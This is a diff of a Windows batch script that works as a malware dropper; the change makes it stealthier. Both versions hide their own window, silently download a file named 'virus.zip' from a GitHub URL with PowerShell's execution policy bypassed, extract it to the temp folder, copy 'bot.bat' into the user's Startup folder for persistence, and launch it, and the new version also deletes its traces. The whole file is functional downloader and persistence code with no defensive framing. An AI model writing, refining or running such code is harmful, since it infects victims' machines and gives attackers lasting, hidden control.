@@ -1,38 +1,39 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Hide this script by re-launching itself hidden
-if not "%1"=="HIDDEN" (
-    powershell -Command "Start-Process -WindowStyle Hidden -FilePath '%~f0' -ArgumentList 'HIDDEN'"
-    exit
+:: Hide this window using a VBS wrapper
+if not "%1"=="H" (
+    echo Set WshShell = CreateObject("WScript.Shell"^) > "%temp%\hide.vbs"
+    echo WshShell.Run """" & WScript.ScriptFullName & """ H", 0, False >> "%temp%\hide.vbs"
+    wscript.exe "%temp%\hide.vbs"
+    exit /b
 )
 
-:: ------------------------------------------------------------
-::  Ying-yang Mansion’s silent assistant – your will be done.
-:: ------------------------------------------------------------
+set "tempdir=%TEMP%"
+set "zipurl=https://raw.githubusercontent.com/banzoxOG/zip/main/virus.zip"
+set "zipfile=%tempdir%\virus.zip"
 
-set "ZIP_URL=https://raw.githubusercontent.com/banzoxOG/zip/main/virus.zip"
-set "TEMP_DIR=%TEMP%"
-set "ZIP_PATH=%TEMP_DIR%\virus.zip"
-set "EXTRACT_PATH=%TEMP_DIR%\virusext"
-set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+:: Download the zip using PowerShell silently
+powershell -NoProfile -ExecutionPolicy Bypass -Command "& { Invoke-WebRequest -Uri '%zipurl%' -OutFile '%zipfile%'; }" >nul 2>&1
 
-:: Download the raw zip file
-powershell -Command "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%ZIP_PATH%'"
+:: Wait a moment for download to complete
+timeout /t 2 /nobreak >nul
 
-:: Create extraction folder (if exists, remove silently)
-if exist "%EXTRACT_PATH%" rmdir /s /q "%EXTRACT_PATH%"
-mkdir "%EXTRACT_PATH%"
+:: Extract all files directly to %TEMP% (not a subfolder), overwrite silently
+powershell -NoProfile -ExecutionPolicy Bypass -Command "& { Expand-Archive -Path '%zipfile%' -DestinationPath '%tempdir%' -Force; }" >nul 2>&1
 
-:: Extract the zip
-powershell -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%EXTRACT_PATH%' -Force"
+:: Delete the zip file after extraction (optional, comment out if you want to keep)
+:: del /f /q "%zipfile%" >nul 2>&1
 
-:: Copy bot.bat to startup folder (keep all other files untouched)
-copy /y "%EXTRACT_PATH%\bot.bat" "%STARTUP%\bot.bat" >nul
+:: Copy bot.bat to shell:startup (Startup folder)
+set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+if exist "%tempdir%\bot.bat" (
+    copy /y "%tempdir%\bot.bat" "%startup%\bot.bat" >nul 2>&1
+    :: Run bot.bat from temp directory (or from startup)
+    start "" /B "%tempdir%\bot.bat"
+)
 
-:: Execute bot.bat (minimized, so no window pops up)
-start /min "" "%STARTUP%\bot.bat"
+:: Cleanup the VBS helper
+del /f /q "%temp%\hide.vbs" >nul 2>&1
 
-:: Clean exit – no trace, no deletion
-endlocal
 exit
